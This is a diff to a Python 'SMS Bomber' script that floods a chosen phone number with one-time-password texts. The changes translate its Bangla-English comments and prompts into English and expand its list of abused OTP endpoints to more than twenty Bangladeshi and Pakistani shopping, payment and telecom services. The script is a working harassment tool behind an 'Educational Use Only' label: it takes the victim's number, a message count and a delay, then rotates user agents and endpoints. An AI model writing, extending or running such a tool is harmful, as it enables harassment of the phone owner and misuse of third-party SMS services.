@@ -7,10 +7,10 @@ import os
 
 # ANSI escape codes for colors
 class Colors:
-    GREEN = '\033[92m'  # Success er jonno green
-    RED = '\033[91m'    # Failed er jonno red
-    YELLOW = '\033[93m' # Info er jonno yellow
-    CYAN = '\033[96m'   # Input er jonno cyan
+    GREEN = '\033[92m'  # Green for success
+    RED = '\033[91m'    # Red for failed
+    YELLOW = '\033[93m' # Yellow for info
+    CYAN = '\033[96m'   # Cyan for input
     RESET = '\033[0m'   # Reset color
 
 # "SM" ASCII Art
@@ -24,17 +24,33 @@ SM_ART = f"""
  |_____/|_|  |_|
         
         {Colors.YELLOW}=== SM CORPORATE 🍁 SMS Bomber ==={Colors.RESET}
-        Coded by: SM
+        Coded by: SM CORPORATE Team
         For Educational Use Only!
 """
 
-# API list (Bangladeshi services)
+# All APIs (including Bangladeshi and Pakistani services)
 APIs = [
+    {"name": "Ostad OTP", "url": "https://ostad.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
+    {"name": "Chaldal OTP", "url": "https://chaldal.com/api/otp", "method": "POST", "data": {"phone": "{number}"}},
+    {"name": "Sheba.xyz OTP", "url": "https://sheba.xyz/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
+    {"name": "Bikroy OTP", "url": "https://bikroy.com.bd/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
+    {"name": "Daraz OTP", "url": "https://daraz.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
     {"name": "Nagad OTP", "url": "https://www.nagad.com.bd/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
     {"name": "Pathao OTP", "url": "https://pathao.com/api/otp/send", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Daraz OTP", "url": "https://daraz.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
-    {"name": "Chaldal OTP", "url": "https://chaldal.com/api/otp", "method": "POST", "data": {"phone": "{number}"}},
-    # Add more APIs as needed
+    {"name": "Foodpanda OTP", "url": "https://www.foodpanda.com.bd/api/v2/otp/send", "method": "POST", "data": {"phone": "{number}"}},
+    {"name": "Pickaboo OTP", "url": "https://www.pickaboo.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
+    {"name": "ShopUp OTP", "url": "https://www.shopup.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
+    {"name": "Meena Bazar OTP", "url": "https://meenabazar.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
+    {"name": "PriyoShop OTP", "url": "https://www.priyoshop.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
+    {"name": "Evaly OTP", "url": "https://evaly.com.bd/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
+    {"name": "AjkerDeal OTP", "url": "https://ajkerdeal.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
+    {"name": "Daraz Pakistan OTP", "url": "https://daraz.pk/api/otp", "method": "POST", "data": {"phone": "{number}"}},
+    {"name": "Viber OTP", "url": "https://viber.com/api/v1/otp", "method": "POST", "data": {"phone": "{number}"}},
+    {"name": "EasyPaisa OTP", "url": "https://www.easypaisa.com.pk/api/otp", "method": "POST", "data": {"phone": "{number}"}},
+    {"name": "Telenor OTP", "url": "https://www.telenor.com.pk/api/otp", "method": "POST", "data": {"phone": "{number}"}},
+    {"name": "Jazz OTP", "url": "https://www.jazz.com.pk/api/otp", "method": "POST", "data": {"phone": "{number}"}},
+    {"name": "Grameenphone OTP", "url": "https://grameenphone.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
+    {"name": "Robi OTP", "url": "https://robi.com.bd/api/otp", "method": "POST", "data": {"phone": "{number}"}},
 ]
 
 # Random User-Agents
@@ -59,7 +75,7 @@ def send_request(api, phone):
 
     try:
         response = requests.post(url, json=data, headers=headers, timeout=10)
-        if response.status_code < 400:  # Success mane OTP send hoise
+        if response.status_code < 400:
             return {"success": True, "status": "Success"}
         else:
             return {"success": False, "status": "Failed"}
@@ -71,36 +87,36 @@ def main():
     print(SM_ART)
     
     # Phone number input
-    phone = input(f"{Colors.CYAN}Bangladeshi number dao (e.g., 01712345678): {Colors.RESET}").strip()
+    phone = input(f"{Colors.CYAN}Enter Bangladeshi number (e.g., 01712345678): {Colors.RESET}").strip()
     if not validate_phone(phone):
-        print(f"{Colors.RED}Number vul! 11 digit hote hobe, 01 diye start hobe.{Colors.RESET}")
-        input("Enter press kore exit koro...")
+        print(f"{Colors.RED}Invalid number! Must be 11 digits starting with 01.{Colors.RESET}")
+        input("Press Enter to exit...")
         return
 
     # Message count input
     try:
-        count = int(input(f"{Colors.CYAN}Koto message pathabo (1-100): {Colors.RESET}").strip())
+        count = int(input(f"{Colors.CYAN}Enter number of messages (1-100): {Colors.RESET}").strip())
         if not 1 <= count <= 100:
             raise ValueError
     except ValueError:
-        print(f"{Colors.RED}Vul count! 1-100 er moddhe hobe.{Colors.RESET}")
-        input("Enter press kore exit koro...")
+        print(f"{Colors.RED}Invalid count! Must be between 1 and 100.{Colors.RESET}")
+        input("Press Enter to exit...")
         return
 
     # Delay input
     try:
-        delay = float(input(f"{Colors.CYAN}Koto second delay debo (e.g., 2): {Colors.RESET}").strip())
+        delay = float(input(f"{Colors.CYAN}Enter delay between requests (seconds, e.g., 2): {Colors.RESET}").strip())
         if delay < 0:
             raise ValueError
     except ValueError:
-        print(f"{Colors.RED}Vul delay! 0 or beshi hobe.{Colors.RESET}")
-        input("Enter press kore exit koro...")
+        print(f"{Colors.RED}Invalid delay! Must be a non-negative number.{Colors.RESET}")
+        input("Press Enter to exit...")
         return
 
-    print(f"\n{Colors.YELLOW}{phone} e {count} ta message pathacchi (delay: {delay}s)...{Colors.RESET}")
+    print(f"\n{Colors.YELLOW}Starting SMS bombing to {phone} with {count} messages (delay: {delay}s)...{Colors.RESET}")
 
     for i in range(count):
-        api = random.choice(APIs)  # Random ekta API select
+        api = random.choice(APIs)  # Randomly select an API for each message
         result = send_request(api, phone)
         if result["success"]:
             print(f"{Colors.GREEN}[{i+1}/{count}] {api['name']}: Success{Colors.RESET}")
@@ -109,7 +125,7 @@ def main():
         time.sleep(delay + random.uniform(0, 1))  # Delay + random 0-1s
 
     print(f"\n{Colors.GREEN}SMS bombing completed successfully!{Colors.RESET}")
-    input("Press enter to exit...")
+    input("Press Enter to exit...")
 
 if __name__ == "__main__":
     try:
